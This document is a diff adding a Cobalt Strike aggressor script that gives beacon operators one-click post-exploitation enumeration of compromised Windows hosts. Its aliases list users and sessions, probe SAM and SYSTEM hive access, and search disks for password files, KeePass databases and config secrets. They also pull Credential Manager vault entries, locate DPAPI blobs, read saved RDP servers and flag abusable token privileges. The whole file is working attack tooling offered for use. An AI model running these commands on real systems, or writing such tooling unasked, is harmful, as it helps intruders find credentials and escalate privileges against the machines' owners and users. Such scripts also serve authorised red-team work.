@@ -1,0 +1,137 @@
+# user_enum.cna — Local user, session, credential surface enumeration
+
+alias local-users {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating local users and groups");
+    bshell($bid, "net user");
+    bshell($bid, "net localgroup");
+    bshell($bid, "net localgroup Administrators");
+    bshell($bid, "wmic useraccount get Name,SID,Disabled,PasswordRequired,PasswordChangeable,LocalAccount /format:list");
+}
+
+alias whoami-full {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Dumping current user context");
+    bshell($bid, "whoami /all");
+    bshell($bid, "whoami /priv");
+    bshell($bid, "whoami /groups");
+}
+
+alias logged-on {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking logged-on users");
+    bshell($bid, "query user");
+    bshell($bid, "query session");
+    bshell($bid, "qwinsta");
+    bshell($bid, "wmic computersystem get UserName /format:list");
+}
+
+alias password-policy {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating password policy");
+    bshell($bid, "net accounts");
+    bshell($bid, "net accounts /domain");
+    bpowershell($bid, "Get-ADDefaultDomainPasswordPolicy | Select-Object ComplexityEnabled,MinPasswordLength,PasswordHistoryCount,LockoutThreshold,LockoutDuration,MaxPasswordAge | Format-List");
+}
+
+alias laps-check {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking for LAPS deployment");
+    bshell($bid, "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft Services\\AdmPwd\" /v AdmPwdEnabled 2>nul");
+    bpowershell($bid, "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object { $_.'ms-Mcs-AdmPwdExpirationTime' -ne $null } | Select-Object Name,'ms-Mcs-AdmPwdExpirationTime' | Format-Table -AutoSize");
+}
+
+alias sam-check {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking SAM hive and credential stores");
+    # Checks whether SAM is accessible; does not dump — use appropriate post-ex module for that
+    bshell($bid, "reg query HKLM\\SAM\\SAM 2>&1");
+    bshell($bid, "dir /a C:\\Windows\\System32\\config\\SAM");
+    bshell($bid, "dir /a C:\\Windows\\System32\\config\\SYSTEM");
+}
+
+alias cred-files {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Searching for credential files and sensitive material");
+    bshell($bid, "dir /s /b /a C:\\Users\\*pass*.txt C:\\Users\\*cred*.txt C:\\Users\\*secret*.txt 2>nul");
+    bshell($bid, "dir /s /b /a C:\\Users\\*password*.xml C:\\Users\\*cred*.xml 2>nul");
+    bshell($bid, "dir /s /b /a C:\\Users\\*.kdbx C:\\Users\\*.kdb 2>nul");
+    bshell($bid, "dir /s /b /a C:\\inetpub\\*.config C:\\inetpub\\*.xml C:\\inetpub\\web.config 2>nul");
+    bshell($bid, "dir /s /b /a C:\\*.config C:\\*.ini 2>nul | findstr /i \"pass secret cred api key token\"");
+}
+
+alias vault-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating Windows Credential Manager vault");
+    bshell($bid, "cmdkey /list");
+    bpowershell($bid, "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $vault = New-Object Windows.Security.Credentials.PasswordVault; $vault.RetrieveAll() | Select-Object UserName,Resource | Format-Table -AutoSize");
+}
+
+alias dpapi-blobs {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Locating DPAPI blobs");
+    bshell($bid, "dir /s /b /a C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\ 2>nul");
+    bshell($bid, "dir /s /b /a C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ 2>nul");
+    bshell($bid, "dir /s /b /a C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\ 2>nul");
+}
+
+alias rdp-saved {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking saved RDP connections");
+    bshell($bid, "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\" /v MRU0 2>nul");
+    bshell($bid, "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s 2>nul");
+}
+
+alias token-privs {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking token privileges for abuse potential");
+    bpowershell($bid, "whoami /priv | findstr /i \"SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeDebugPrivilege\"");
+}
+
+alias user-enum-all {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c2[*] === Running full user enumeration ===");
+    whoami-full($bid);
+    local-users($bid);
+    logged-on($bid);
+    password-policy($bid);
+    laps-check($bid);
+    sam-check($bid);
+    cred-files($bid);
+    vault-enum($bid);
+    dpapi-blobs($bid);
+    rdp-saved($bid);
+    token-privs($bid);
+}
+
+# ─── right-click menu ───────────────────────────────────────────────────────
+
+popup beacon_bottom {
+    menu "Enum: Users & Creds" {
+        item "Whoami (Full)"             { whoami-full(selectedBeacons()); }
+        item "Local Users & Groups"      { local-users(selectedBeacons()); }
+        item "Logged-On Sessions"        { logged-on(selectedBeacons()); }
+        item "Password Policy"           { password-policy(selectedBeacons()); }
+        item "LAPS Check"                { laps-check(selectedBeacons()); }
+        item "SAM Accessibility"         { sam-check(selectedBeacons()); }
+        item "Credential Files (disk)"   { cred-files(selectedBeacons()); }
+        item "Windows Vault"             { vault-enum(selectedBeacons()); }
+        item "DPAPI Blobs"               { dpapi-blobs(selectedBeacons()); }
+        item "Saved RDP Connections"     { rdp-saved(selectedBeacons()); }
+        item "Token Privileges"          { token-privs(selectedBeacons()); }
+        separator;
+        item "\[Run All\] User Enum"     { user-enum-all(selectedBeacons()); }
+    }
+}
